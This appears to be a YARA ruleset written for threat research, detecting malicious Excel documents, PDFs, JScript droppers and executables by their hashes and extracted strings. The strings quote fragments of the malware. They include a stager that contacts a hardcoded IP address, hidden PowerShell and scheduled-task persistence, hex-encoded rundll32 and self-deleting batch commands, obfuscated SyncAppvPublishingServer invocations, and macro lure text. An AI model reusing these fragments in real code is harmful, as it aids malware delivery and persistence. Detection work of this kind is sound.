      hash1 = "b1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c"
   strings:
      $x1 = "    manifest = [':80','://','http','185.118.164.213','c:\\\\users\\\\public\\\\',WScript.ScriptName,'GET','http://ipinfo.io/ip'," ascii
      $x2 = "cript.ScriptFullName,'powershell -WindowStyle Hidden Start-Process wscript -ArgumentList ',' -WindowStyle Hidden','cmd /c SchTas" ascii
      $x3 = "    manifest = [':80','://','http','185.118.164.213','c:\\\\users\\\\public\\\\',WScript.ScriptName,'GET','http://ipinfo.io/ip'," ascii
      $x4 = "ks  /Create /SC DAILY  /TN \"Test Task\" /TR \"','\" /ST 10:01 /F' ,'exc','cmd /c taskkill /f /im WScript.exe','App','You should" ascii
      $s5 = "        u = netObj.ComputerName + '/' + shellObj.ExpandEnvironmentStrings(\"%USERNAME%\");" fullword ascii
      $s6 = "var c = \"c:\\\\users\\\\\"+shellObj.ExpandEnvironmentStrings(\"%USERNAME%\")+\"\\\\\"" fullword ascii
      $s7 = "    var oExec = oShell.Run(cm,0,false);}" fullword ascii
      $s8 = "        var shellObj = new ActiveXObject(\"WScript.Shell\");" fullword ascii
      $s9 = "else{if(1){WScript.sleep(10 * 1000);AddTo(c);}" fullword ascii
      $s10 = "    if (key.length > 1){WScript.sleep(20 * 1000);subkeys(key)}" fullword ascii
      $s11 = "function subkeys_run(runer){" fullword ascii
      $s12 = "if ( b[3] === manifestation(16)+manifestation(18)){WScript.Echo(manifestation(17));}" fullword ascii
      $s13 = "    WScript.sleep(20 * 1000);" fullword ascii
      $s14 = "    WScript.sleep(3 * 1000)" fullword ascii
      $s15 = "function subkeys(key){" fullword ascii
      $s16 = "    var oShell = WScript.CreateObject(\"WScript.Shell\");" fullword ascii
      $s17 = "    var oS = WScript.CreateObject(\"WScript.Shell\");" fullword ascii
      $s18 = "    Res.Open(manifestation(6), manifestation(2)+manifestation(1)+manifestation(3)+manifestation(0)+manifestation(20)+ key , fals" ascii
      $s19 = "    Res.Open(manifestation(6), manifestation(2)+manifestation(1)+manifestation(3)+manifestation(0)+manifestation(20)+ key , fals" ascii
      $s20 = "        subkeys_run(Res);" fullword ascii
   condition:
      uint16(0) == 0x7566 and filesize < 9KB and
      1 of ($x*) and 4 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec_a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278e_0 {
   meta:
      description = "data - from files 26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec"
      hash2 = "a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c"
      hash3 = "3e6986d4dc7610c059aa8a51a61e30bcf509b7c2b5b4e931134c42384a0deea6"
   strings:
      $x1 = "C:\\Windows\\system32\\FM20.DLL" fullword ascii
      $x2 = "C:\\Users\\poopak\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd" fullword ascii
      $s3 = "*\\G{0D452EE1-E08F-101A-852E-02608C4D0BB4}#2.0#0#C:\\Windows\\system32\\FM20.DLL#Microsoft Forms 2.0 Object Library" fullword wide
      $s4 = "*\\G{7C0D9C4B-D689-4544-B2A4-82E8E8154916}#2.0#0#C:\\Users\\poopak\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd#Microsoft Forms " wide
      $s5 = "_B_var_login" fullword ascii
      $s6 = "MsgBox ('User and Password is correct.')\"" fullword wide
      $s7 = "In order to view the content please click Enable Editing and Enable Content from the yellow bar above" fullword ascii
      $s8 = "r excel png logo" fullword wide
      $s9 = ") - r1J" fullword ascii
      $s10 = " 78 65 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c 2c 53 74 61 72 74 22 20 26 26 20 44 4" wide /* hex encoded string 'xe C:\ProgramData\Exchange.dll,Start" && DEL "%~f0"' */
      $s11 = "63 6d 64 2e 65 78 65 20 2f 63 20 73 74 61 72 74 20 2f 62 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74" fullword wide /* hex encoded string 'cmd.exe /c start /b C:\ProgramData\tt.bat' */
      $s12 = "70 6f 77 65 72 73 68 65 6c 6c 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 43 3a 5c 50 72" wide /* hex encoded string 'powershell Start-Process rundll32.exe C:\ProgramData\Exchange.dll,Start' */
      $s13 = "43 41 4c 4c" fullword wide /* hex encoded string 'CALL' */
      $s14 = "43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c&" fullword wide /* hex encoded string 'C:\ProgramData\Exchange.dll' */
      $s15 = "4b 65 72 6e 65 6c 33 32" fullword wide /* hex encoded string 'Kernel32' */
      $s16 = "57 69 6e 45 78 65 63\"" fullword wide /* hex encoded string 'WinExec' */
      $s17 = "43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74," fullword wide /* hex encoded string 'C:\ProgramData\tt.bat' */
      $s18 = "efghijkl" fullword ascii
      $s19 = "taBytes @- 1" fullword ascii
      $s20 = "yCompare" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 5000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf_63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e_1 {
   meta:
      description = "data - from files 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf, 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf"
      hash2 = "fff275f39ab9d6c282963f568dc62ca0c23456d9ccf22c8baedb23d3208b24fb"
   strings:
      $x1 = "C:\\WINDOWS\\system32\\FM20.DLL" fullword ascii
      $x2 = "C:\\Users\\pk\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd" fullword ascii
      $s3 = "*\\G{0D452EE1-E08F-101A-852E-02608C4D0BB4}#2.0#0#C:\\WINDOWS\\system32\\FM20.DLL#Microsoft Forms 2.0 Object Library" fullword wide
      $s4 = "*\\G{234FEE78-FB2C-43EF-B5C6-02EF502EED53}#2.0#0#C:\\Users\\pk\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd#Microsoft Forms 2.0 " wide
      $s5 = "C:\\Windows\\System32\\stdole2" fullword ascii
      $s6 = "w.Exec" fullword ascii
      $s7 = "bgetfpmil" fullword ascii
      $s8 = "view the content please click Enable Editing and Enable Content from the yellow bar above" fullword ascii
      $s9 = "Writ.tlb" fullword ascii
      $s10 = "_B_var_bgetfpmil" fullword ascii
      $s11 = "5c 50 72@ 6f 67" fullword ascii /* hex encoded string '\Prog' */
      $s12 = "wkqokfnelm" fullword ascii
      $s13 = "lbjonoayf" fullword ascii
      $s14 = "ycdnksjrb" fullword ascii
      $s15 = "nopqrstu" fullword ascii
      $s16 = "hskthakcde" fullword ascii
      $s17 = "urjvuojycj" fullword ascii
      $s18 = "dajwmrcgmq" fullword ascii
      $s19 = "gqwjpocie" fullword ascii
      $s20 = "rpudxxkep" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 5000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _921b4520b75fcd0071944a483d738223b222ba101e70f2950fbfbc22afbdb5d0_d7de68febbbdb72ff820f6554afb464b5c204c434faa6ffe9b4daf6b69_2 {
   meta:
      description = "data - from files 921b4520b75fcd0071944a483d738223b222ba101e70f2950fbfbc22afbdb5d0.pdf, d7de68febbbdb72ff820f6554afb464b5c204c434faa6ffe9b4daf6b691d535f.pdf"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "921b4520b75fcd0071944a483d738223b222ba101e70f2950fbfbc22afbdb5d0"
      hash2 = "d7de68febbbdb72ff820f6554afb464b5c204c434faa6ffe9b4daf6b691d535f"
   strings:
      $s1 = "<</Author(nejla) /Creator(" fullword ascii
      $s2 = "<</Type/FontDescriptor/FontName/ArialMT/Flags 32/ItalicAngle 0/Ascent 905/Descent -210/CapHeight 728/AvgWidth 441/MaxWidth 2665/" ascii
      $s3 = "<</Type/FontDescriptor/FontName/ABCDEE+Calibri/Flags 32/ItalicAngle 0/Ascent 750/Descent -250/CapHeight 750/AvgWidth 521/MaxWidt" ascii
      $s4 = "<</Type/FontDescriptor/FontName/ArialMT/Flags 32/ItalicAngle 0/Ascent 905/Descent -210/CapHeight 728/AvgWidth 441/MaxWidth 2665/" ascii
      $s5 = "0000000031 65535 f" fullword ascii /* hex encoded string '1eS_' */
      $s6 = "0000000025 65535 f" fullword ascii /* hex encoded string '%eS_' */
      $s7 = "0000000022 65535 f" fullword ascii /* hex encoded string '"eS_' */
      $s8 = "0000000020 65535 f" fullword ascii /* hex encoded string ' eS_' */
      $s9 = "0000000028 65535 f" fullword ascii /* hex encoded string '(eS_' */
      $s10 = "0000000023 65535 f" fullword ascii /* hex encoded string '#eS_' */
      $s11 = "0000000037 65535 f" fullword ascii /* hex encoded string '7eS_' */
      $s12 = "0000000021 65535 f" fullword ascii /* hex encoded string '!eS_' */
      $s13 = "0000000035 65535 f" fullword ascii /* hex encoded string '5eS_' */
      $s14 = "0000000029 65535 f" fullword ascii /* hex encoded string ')eS_' */
      $s15 = "0000000030 65535 f" fullword ascii /* hex encoded string '0eS_' */
      $s16 = "0000000024 65535 f" fullword ascii /* hex encoded string '$eS_' */
      $s17 = "0000000032 65535 f" fullword ascii /* hex encoded string '2eS_' */
      $s18 = "0000000034 65535 f" fullword ascii /* hex encoded string '4eS_' */
      $s19 = "0000000026 65535 f" fullword ascii /* hex encoded string '&eS_' */
      $s20 = "0000000027 65535 f" fullword ascii /* hex encoded string ''eS_' */
   condition:
      ( uint16(0) == 0x5025 and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec_63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e_3 {
   meta:
      description = "data - from files 26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec, 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf, 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf.xls, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec"
      hash2 = "63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf"
      hash3 = "fff275f39ab9d6c282963f568dc62ca0c23456d9ccf22c8baedb23d3208b24fb"
      hash4 = "a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c"
      hash5 = "3e6986d4dc7610c059aa8a51a61e30bcf509b7c2b5b4e931134c42384a0deea6"
   strings:
      $s1 = "ExecuteExcel4Macro" fullword ascii
      $s2 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s3 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s4 = "Enhanced by intelligence, Excel learns your patterns, organizing your data to save you time. Create spreadsheets with ease from " ascii
      $s5 = "Get a better picture of your data" fullword ascii
      $s6 = "Work better together" fullword ascii
      $s7 = "-2]\\ #,##0.00\\)" fullword wide /* hex encoded string ' ' */
      $s8 = "Image result for microsoft excel logo png transparent" fullword wide
      $s9 = "constrp" fullword ascii
      $s10 = "drs/shapexml.xml" fullword ascii
      $s11 = "Enhanced by intelligence, Excel learns your patterns, organizing your data to save you time. Create spreadsheets with ease from " ascii
      $s12 = "This Excel Document is created in earlier version of Microsoft Office Excel" fullword ascii
      $s13 = "New charts and graphs help you present your data in compelling ways, with formatting, sparklines, and tables to better understan" ascii
      $s14 = "templates or on your own, and perform calculations with modern formulas." fullword ascii
      $s15 = "decode_a" fullword ascii
      $s16 = ":l!IRC" fullword ascii
      $s17 = "DWIDATx^" fullword ascii
      $s18 = "CharCounter" fullword ascii
      $s19 = " GmjlA#u" fullword ascii
      $s20 = "Document=Sheet2/&H00000000" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34_a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf67_4 {
   meta:
      description = "data - from files a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34"
      hash2 = "9e614ba0fe16b63913f535fe74ef84a8352bd52d3ef4cbde1ee6c8f8953915c3"
   strings:
      $s1 = "zEyeY$" fullword ascii
      $s2 = "ncsKkSK3" fullword ascii
      $s3 = "ti /H?" fullword ascii
      $s4 = "HNDP'?y^M" fullword ascii
      $s5 = "DPB=\"DEDCC1945F6CCF6DCF6DCF\"" fullword ascii
      $s6 = "t>TVYVY7z" fullword ascii
      $s7 = "EOyWu*&*'}" fullword ascii
      $s8 = "DEDCC1945F6CCF6DCF6DCF" ascii
      $s9 = "vFpR6wD" fullword ascii
      $s10 = "JbWbZZ|" fullword ascii
      $s11 = "~oHMY\"Y" fullword ascii
      $s12 = "ohnl\"`" fullword ascii
      $s13 = "&FgMUy\"" fullword ascii
      $s14 = "X8VYYS_^S" fullword ascii
      $s15 = "[jSIh^.Qm" fullword ascii
      $s16 = "CVCmMsS" fullword ascii
      $s17 = "<hHmM9ql" fullword ascii
      $s18 = "wlolo'ZP" fullword ascii
      $s19 = "jRkV3,D" fullword ascii
      $s20 = "indz,GRA#" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d_b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f3_5 {
   meta:
      description = "data - from files b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d"
      hash2 = "8908f8f4a9e4a6f28857396ff9f73c98e97a41382ecc5a24f4a2a37431989152"
   strings:
      $s1 = "41435E6662666266626662" ascii /* hex encoded string 'AC^fbfbfbfb' */
      $s2 = "===EEE" fullword ascii /* reversed goodware string 'EEE===' */
      $s3 = "a!!!$A" fullword ascii
      $s4 = " -3/-;?cpd" fullword ascii
      $s5 = "%r!* v\\" fullword ascii
      $s6 = "O4GZZZNNN" fullword ascii
      $s7 = "gGYvQF#" fullword ascii
      $s8 = "|yUYay!" fullword ascii
      $s9 = "gqsA=I?y" fullword ascii
      $s10 = "DPB=\"82809DDEDFDFDFDFDF\"" fullword ascii
      $s11 = "BVHa}oE" fullword ascii
      $s12 = "illd=4zd" fullword ascii
      $s13 = "DRiUiAU" fullword ascii
      $s14 = "bDAbV)`" fullword ascii
      $s15 = "LIcu\\`(" fullword ascii
      $s16 = "Yqpy^YN" fullword ascii
      $s17 = "BSffr~qv00" fullword ascii
      $s18 = "6DmQaUQ5" fullword ascii
      $s19 = "PFvrjJ<" fullword ascii
      $s20 = "emna!?" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec_5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea4_6 {
   meta:
      description = "data - from files 26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec, 5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4, 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf, 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf.xls, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c.xls, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34.xls, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d.xls, c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb, main.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec"
      hash2 = "5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4"
      hash3 = "63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf"
      hash4 = "fff275f39ab9d6c282963f568dc62ca0c23456d9ccf22c8baedb23d3208b24fb"
      hash5 = "a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c"
      hash6 = "3e6986d4dc7610c059aa8a51a61e30bcf509b7c2b5b4e931134c42384a0deea6"
      hash7 = "a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34"
      hash8 = "9e614ba0fe16b63913f535fe74ef84a8352bd52d3ef4cbde1ee6c8f8953915c3"
      hash9 = "b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d"
      hash10 = "8908f8f4a9e4a6f28857396ff9f73c98e97a41382ecc5a24f4a2a37431989152"
      hash11 = "c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb"
      hash12 = "f45675f2a44f1c5a9eba95e85e5ea7defc15a54c6377746ba42cdfc6e4639b5a"
   strings:
      $x1 = "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE15\\MSO.DLL" fullword ascii
      $s2 = "C:\\PROGRA~1\\COMMON~1\\MICROS~1\\VBA\\VBA7.1\\VBE7.DLL" fullword ascii
      $s3 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.7#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE15\\MSO.DLL#Microsoft " wide
      $s4 = "C:\\Program Files\\Microsoft Office\\Office15\\EXCEL.EXE" fullword ascii
      $s5 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\System32\\stdole2.tlb#OLE Automation" fullword wide
      $s6 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\PROGRA~1\\COMMON~1\\MICROS~1\\VBA\\VBA7.1\\VBE7.DLL#Visual Basic For Applic" wide
      $s7 = "*\\G{00020813-0000-0000-C000-000000000046}#1.8#0#C:\\Program Files\\Microsoft Office\\Office15\\EXCEL.EXE#Microsoft Excel 15.0 O" wide
      $s8 = "DocumentUserPassword" fullword wide
      $s9 = "DocumentOwnerPassword" fullword wide
      $s10 = "UniresDLL" fullword ascii
      $s11 = "#C:\\Wind" fullword ascii
      $s12 = "Windows User" fullword ascii
      $s13 = "E15\\MSO.0DLL#" fullword ascii
      $s14 = "Bustomi" fullword ascii
      $s15 = "Replacef" fullword ascii
      $s16 = "Workbookk" fullword ascii
      $s17 = "_(* #,##0.00_);_(* \\(#,##0.00\\);_(* \"-\"??_);_(@_)" fullword ascii
      $s18 = "ResOption1" fullword ascii
      $s19 = "_(\"$\"* #,##0.00_);_(\"$\"* \\(#,##0.00\\);_(\"$\"* \"-\"??_);_(@_)" fullword ascii
      $s20 = "_(* #,##0_);_(* \\(#,##0\\);_(* \"-\"_);_(@_)" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 5000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4_c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b30_7 {
   meta:
      description = "data - from files 5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4, c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb, main.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4"
      hash2 = "c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb"
      hash3 = "f45675f2a44f1c5a9eba95e85e5ea7defc15a54c6377746ba42cdfc6e4639b5a"
   strings:
      $s1 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
      $s2 = "d5-ba3d-11da-ad31-d33d75182f1b\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"><xmp:CreateDate>2021-09-13T17:26:48.964</xmp:CreateD" ascii
      $s3 = "\\Links\\LaId.vbs" fullword wide
      $s4 = " rundll" fullword ascii
      $s5 = "1.1/\"><dc:creator><rdf:Seq xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:li>pk</rdf:li></rdf:Seq>" fullword ascii
      $s6 = "32.exe p@cwutl." fullword ascii
      $s7 = "entPrope" fullword ascii
      $s8 = "gFjtJDrf" fullword ascii
      $s9 = "gQLKWTnzSX" fullword ascii
      $s10 = "_B_var_ZNltQsw?" fullword ascii
      $s11 = "Module1=26, 26, 1313, 607, Z" fullword ascii
      $s12 = "wxVXrGD" fullword ascii
      $s13 = "lehS*tpi" fullword ascii
      $s14 = "ook.Buil" fullword ascii
      $s15 = "FCFE2323DF20E020E020" ascii
      $s16 = "o]%s~<" fullword ascii
      $s17 = "O, gQLKW TnzSX" fullword ascii
      $s18 = "_B_var_gFjtJDr" fullword ascii
      $s19 = "rties.It" fullword ascii
      $s20 = "gFjtJDrUq" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _7dc49601fa6485c3a2cb1d519794bee004fb7fc0f3b37394a1aef6fceefec0c8_f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb_8 {
   meta:
      description = "data - from files 7dc49601fa6485c3a2cb1d519794bee004fb7fc0f3b37394a1aef6fceefec0c8.exe, f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb91d285.exe"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "7dc49601fa6485c3a2cb1d519794bee004fb7fc0f3b37394a1aef6fceefec0c8"
      hash2 = "f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb91d285"
   strings:
      $x1 = "C:\\Windows\\System32\\SyncAppvPublishingServer.vbs \"n;.('{2}{0}{1}' -f[string][char][int]101,[string][char][int]88,'i')([Syste" wide
      $s2 = "TkZOMGNtbHVaeWdrU1ZZcERRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdaV3h6WlNCN0RRb2dJQ0FnSUNBZ0lDQWdJQ0FrWVdWelRXRnVZV2RsWkM1SlZpQTlJQ1JK" ascii /* base64 encoded string 'NFN0cmluZygkSVYpDQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAkYWVzTWFuYWdlZC5JViA9ICRJ' */
      $s3 = "ZVhCMGIyZHlZWEJvZVM1UVlXUmthVzVuVFc5a1pWMDZPbEJMUTFNM0RRb2dJQ0FnSkdGbGMwMWhibUZuWldRdVFteHZZMnRUYVhwbElEMGdNVEk0RFFvZ0lDQWdKR0Zs" ascii /* base64 encoded string 'eXB0b2dyYXBoeS5QYWRkaW5nTW9kZV06OlBLQ1M3DQogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4DQogICAgJGFl' */
      $s4 = "WlhFZ0lsTjBjbWx1WnlJcElIc05DaUFnSUNBZ0lDQWdJQ0FnSUNSaFpYTk5ZVzVoWjJWa0xrbFdJRDBnVzFONWMzUmxiUzVEYjI1MlpYSjBYVG82Um5KdmJVSmhjMlUy" ascii /* base64 encoded string 'ZXEgIlN0cmluZyIpIHsNCiAgICAgICAgICAgICRhZXNNYW5hZ2VkLklWID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2' */
      $s5 = "Skd0bGVRMEtJQ0FnSUNBZ0lDQjlEUW9nSUNBZ2ZRMEtJQ0FnSUNSaFpYTk5ZVzVoWjJWa0RRcDlEUXBtZFc1amRHbHZiaUJEUVVzb0tTQjdEUW9nSUNBZ0pHRmxjMDFo" ascii /* base64 encoded string 'JGtleQ0KICAgICAgICB9DQogICAgfQ0KICAgICRhZXNNYW5hZ2VkDQp9DQpmdW5jdGlvbiBDQUsoKSB7DQogICAgJGFlc01h' */
      $s6 = "TkZOMGNtbHVaeWdrYTJWNUtRMEtJQ0FnSUNBZ0lDQjlEUW9nSUNBZ0lDQWdJR1ZzYzJVZ2V3MEtJQ0FnSUNBZ0lDQWdJQ0FnSkdGbGMwMWhibUZuWldRdVMyVjVJRDBn" ascii /* base64 encoded string 'NFN0cmluZygka2V5KQ0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgJGFlc01hbmFnZWQuS2V5ID0g' */
      $s7 = "VmcwS0lDQWdJQ0FnSUNCOURRb2dJQ0FnZlEwS0lDQWdJR2xtSUNna2EyVjVLU0I3RFFvZ0lDQWdJQ0FnSUdsbUlDZ2thMlY1TG1kbGRGUjVjR1VvS1M1T1lXMWxJQzFs" ascii /* base64 encoded string 'Vg0KICAgICAgICB9DQogICAgfQ0KICAgIGlmICgka2V5KSB7DQogICAgICAgIGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1l' */
      $s8 = "YzAxaGJtRm5aV1F1UzJWNVUybDZaU0E5SURJMU5nMEtJQ0FnSUdsbUlDZ2tTVllwSUhzTkNpQWdJQ0FnSUNBZ2FXWWdLQ1JKVmk1blpYUlVlWEJsS0NrdVRtRnRaU0F0" ascii /* base64 encoded string 'c01hbmFnZWQuS2V5U2l6ZSA9IDI1Ng0KICAgIGlmICgkSVYpIHsNCiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAt' */
      $s9 = "Wm5WdVkzUnBiMjRnUTBGTlR5Z2thMlY1TENBa1NWWXBJSHNOQ2lBZ0lDQWtZV1Z6VFdGdVlXZGxaQ0E5SUU1bGR5MVBZbXBsWTNRZ0lsTjVjM1JsYlM1VFpXTjFjbWww" ascii /* base64 encoded string 'ZnVuY3Rpb24gQ0FNTygka2V5LCAkSVYpIHsNCiAgICAkYWVzTWFuYWdlZCA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0' */
      $s10 = "ZEc5bmNtRndhSGt1UTJsd2FHVnlUVzlrWlYwNk9rTkNRdzBLSUNBZ0lDUmhaWE5OWVc1aFoyVmtMbEJoWkdScGJtY2dQU0JiVTNsemRHVnRMbE5sWTNWeWFYUjVMa055" ascii /* base64 encoded string 'dG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQw0KICAgICRhZXNNYW5hZ2VkLlBhZGRpbmcgPSBbU3lzdGVtLlNlY3VyaXR5LkNy' */
      $s11 = "Y1NBaVUzUnlhVzVuSWlrZ2V3MEtJQ0FnSUNBZ0lDQWdJQ0FnSkdGbGMwMWhibUZuWldRdVMyVjVJRDBnVzFONWMzUmxiUzVEYjI1MlpYSjBYVG82Um5KdmJVSmhjMlUy" ascii /* base64 encoded string 'cSAiU3RyaW5nIikgew0KICAgICAgICAgICAgJGFlc01hbmFnZWQuS2V5ID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2' */
